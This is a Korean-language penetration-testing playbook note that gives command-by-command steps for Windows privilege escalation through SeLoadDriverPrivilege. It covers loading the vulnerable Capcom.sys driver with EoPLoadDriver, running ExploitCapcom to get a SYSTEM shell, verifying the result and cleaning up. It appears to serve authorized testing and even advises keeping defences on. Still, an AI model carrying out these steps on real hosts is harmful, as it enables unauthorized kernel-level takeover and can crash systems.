---
aliases: ["Print Operators SeLoadDriverPrivilege 권한 상승"]
tags:
  - 환경/windows
시작조건: ["대상 Windows 호스트의 셸 또는 세션 확보", "현재 token에 SeLoadDriverPrivilege가 존재"]
필요권한: ["현재 process token의 SeLoadDriverPrivilege", "loader가 해당 privilege를 활성화할 수 있는 token"]
필요조건: ["대상 OS·architecture와 호환되는 취약한 signed kernel driver", "EoPLoadDriver와 driver별 exploit", "App Control·HVCI·vulnerable driver blocklist가 해당 driver load를 차단하지 않음"]
결과: ["취약 driver의 kernel load 확인", "driver exploit가 만든 SYSTEM process", "driver load만 성공하고 SYSTEM 실행은 미확인인 중간 상태"]
---

# SeLoadDriverPrivilege로 취약 드라이버 권한 상승

## 한 줄 판단

현재 token에 `SeLoadDriverPrivilege`가 있고 취약 driver가 대상 build·architecture와 호환되며 Code Integrity 정책이 load를 허용할 때만, privilege-aware loader로 driver를 등록·load하고 driver별 exploit가 생성한 새 process의 Identity로 SYSTEM 상승을 검증한다.

> kernel driver load와 exploit는 crash·재부팅·보안 제품 탐지를 일으킬 수 있다. registry key나 파일을 제거해도 loaded driver, event log 또는 장애 영향은 자동으로 복구되지 않는다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 실행 위치 | 권한 상승 대상 Windows host의 현재 shell | `hostname`, `whoami /all` | 공격 호스트와 대상 호스트를 구분 |
| 현재 token | `SeLoadDriverPrivilege`가 token에 존재 | `whoami /priv` | Print Operators 그룹 목록과 현재 token을 구분하고 새 로그온 필요 여부 확인 |
| driver 입력 | 대상 OS·architecture와 호환되는 signed 취약 driver | signature·architecture와 사용 중인 driver 문서 확인 | 임의 driver나 출처 불명 binary를 load하지 않음 |
| loader·exploit | driver registry path를 만들고 privilege를 활성화·load하는 loader와 해당 driver 전용 exploit | upstream 사용법 확인 | generic loader 성공을 driver exploit 성공으로 확대하지 않음 |
| 방어 조건 | HVCI, App Control·WDAC, vulnerable driver blocklist와 ASR 상태 확인 | Device Guard 상태와 CodeIntegrity Operational event 확인 | 방어 기능을 끄지 말고 차단을 현재 환경의 미충족 조건으로 기록 |

Print Operators 멤버십은 Domain Controller에서 `SeLoadDriverPrivilege`를 부여하는 기본 경로 중 하나지만, 그룹 멤버십·현재 token의 privilege·driver load·kernel exploit·SYSTEM process는 각각 다른 상태다. 자세한 경계는 [[Windows 액세스 토큰과 특권 활성화]]를 따른다.

## 실행

### 1. token·OS·방어 기준선 확인

```cmd
whoami /all
whoami /priv
systeminfo
```

```powershell
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
  Select-Object VirtualizationBasedSecurityStatus,SecurityServicesConfigured,SecurityServicesRunning
Get-WinEvent -LogName 'Microsoft-Windows-CodeIntegrity/Operational' -MaxEvents 20 |
  Select-Object TimeCreated,Id,Message
```

확인할 출력:

- `SeLoadDriverPrivilege`의 존재와 `Disabled`·`Enabled` 상태. `Disabled`는 보유하지 않았다는 뜻이 아니며 loader의 활성화 성공을 다시 확인한다.
- exact Windows build·architecture와 HVCI·Code Integrity·driver block event. 차단 기능을 비활성화하는 절차로 우회하지 않는다.

### 2. 입력 파일과 기존 상태 기록

`<VULNERABLE_DRIVER_PATH>`, `<EOPLOADDRIVER_PATH>`, `<DRIVER_EXPLOIT_PATH>`는 대상 Windows 호스트에서 이번 작업에 반입한 driver·loader·driver별 exploit의 절대 경로다. `<DRIVER_SERVICE_NAME>`은 이번 loader가 만들 사용자 hive service key 이름이고 `<DRIVER_NAME>`은 `driverquery`에서 확인할 loaded driver 이름이다. 이 path·key·driver 이름은 서로 같은 값으로 추정하지 않는다.

```powershell
Get-AuthenticodeSignature -FilePath '<VULNERABLE_DRIVER_PATH>' |
  Select-Object Status,StatusMessage,SignerCertificate,TimeStamperCertificate
reg query "HKCU\System\CurrentControlSet\<DRIVER_SERVICE_NAME>"
driverquery /v | Select-String '<DRIVER_NAME>'
```

확인할 출력:

- driver signature status와 기존 registry key·loaded driver 부재.
- driver가 이미 존재하면 이번 실행의 생성물과 구분할 수 없으므로 중단하고 상태를 재평가한다.

### 3. EoPLoadDriver로 privilege 활성화와 driver load

```cmd
"<EOPLOADDRIVER_PATH>" System\CurrentControlSet\<DRIVER_SERVICE_NAME> <VULNERABLE_DRIVER_PATH>
whoami /priv
driverquery /v | findstr /i "<DRIVER_NAME>"
```

확인할 출력:

- loader가 표시하는 privilege 활성화·registry path·driver load 결과와 `driverquery`·CodeIntegrity event의 상태.
- loader의 문자열만 성공으로 해석하지 말고 `driverquery`와 CodeIntegrity event에서 exact driver가 loaded 상태인지 확인한다.
- 최신 Windows는 사용자 hive 기반 driver service path 또는 취약 driver 자체를 거부할 수 있다. 이 경우 환경 조건 미충족이며 방어 제어를 끄지 않는다.

### 4. driver별 exploit로 SYSTEM process 확인

Capcom.sys에서는 driver가 실제 loaded 상태일 때만 전용 exploit를 실행한다.

```cmd
"<DRIVER_EXPLOIT_PATH>"
```

Driver Verifier가 활성화된 지원 환경에서 upstream이 요구할 때만 다음 option을 고려한다.

```cmd
"<DRIVER_EXPLOIT_PATH>" --mitigatedv
```

새로 생성된 shell에서 확인한다.

```cmd
whoami /all
```

확인할 출력:

- `Shellcode was executed`, `Token stealing was successful`, `SYSTEM shell was launched`와 새 process의 `nt authority\system`을 함께 확인한다.
- driver load 성공만으로 SYSTEM을 획득한 것이 아니다. exploit output과 child Identity가 모두 필요하다.
- crash·hang·Code Integrity block이 보이면 반복 실행하지 않고 복구 단계로 이동한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `SeLoadDriverPrivilege Disabled` | privilege는 token에 있으나 아직 활성화되지 않음 | 조건 일부 충족 | loader의 활성화 결과와 실제 driver load를 확인 |
| driver loaded, exploit 미실행·실패 | kernel driver만 추가됨 | SYSTEM 실행 미확인·host 영향 존재 | 반복 exploit보다 exact 정리와 정책·build 조건 재검토 |
| exploit 성공 출력과 child `nt authority\system` | kernel exploit와 SYSTEM process 생성 확인 | Windows SYSTEM 세션 | [[고권한 세션 확보 후 후속 판단]] |
| CodeIntegrity·WDAC·blocklist event | driver load가 정책으로 차단됨 | 현재 경로 실행 불가 | 방어 제어를 유지하고 다른 권한 상승 후보로 전환 |
| privilege 이름이 현재 token에 없음 | 그룹 상태 또는 사용자 권한 할당이 token에 반영되지 않음 | 전제 미충족 | 새 로그온과 현재 계정·그룹 확인. privilege를 임의 부여하지 않음 |
| bugcheck·service 불안정 | kernel exploit 영향 발생 | host 장애 | 작업을 중단하고 환경의 복구·재부팅 절차로 전환 |

## 변경 영향과 복구

EoPLoadDriver가 만든 이번 사용자 hive의 exact key와 반입 파일만 제거한다. registry key 삭제가 이미 loaded된 kernel driver를 unload하지는 않는다. driver가 unload routine을 제공하지 않거나 loader가 unload를 지원하지 않으면 재부팅 전까지 loaded 상태가 남을 수 있으므로 완전 복구로 기록하지 않는다.

복구에는 실행 단계에서 기록한 동일한 `<DRIVER_SERVICE_NAME>`, 세 파일 절대 경로와 `<DRIVER_NAME>`을 다시 사용한다. 다른 service key·driver 또는 작업 전 파일은 삭제하지 않는다.

```cmd
reg delete "HKCU\System\CurrentControlSet\<DRIVER_SERVICE_NAME>" /f
del /f "<VULNERABLE_DRIVER_PATH>"
del /f "<EOPLOADDRIVER_PATH>"
del /f "<DRIVER_EXPLOIT_PATH>"
reg query "HKCU\System\CurrentControlSet\<DRIVER_SERVICE_NAME>"
driverquery /v | findstr /i "<DRIVER_NAME>"
```

registry query가 key 부재를 반환하고 파일이 없어도 `driverquery`에 남아 있으면 driver는 아직 loaded 상태다. 임의 `sc delete`나 다른 driver 제거로 확대하지 말고 driver별 unload 절차 또는 재부팅 뒤 호스트 정상성을 검증한다. event log·EDR 기록과 crash 영향은 파일 삭제로 복구되지 않는다.

## 관련 도구

- [[EoPLoadDriver]]
- [[ExploitCapcom]]
- [[powershell]]

## 관련 상태 라우터

- [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- [[Windows 위임 운영 그룹 확인 후 권한 경로 선택]]
- [[고권한 세션 확보 후 후속 판단]]

## 참고 링크

- [Microsoft Learn: Print Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#print-operators)
- [Microsoft Learn: Privilege Constants](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
- [Microsoft Learn: Microsoft recommended driver block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules)
- [Tarlogic Security: EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver)
- [tandasat: ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
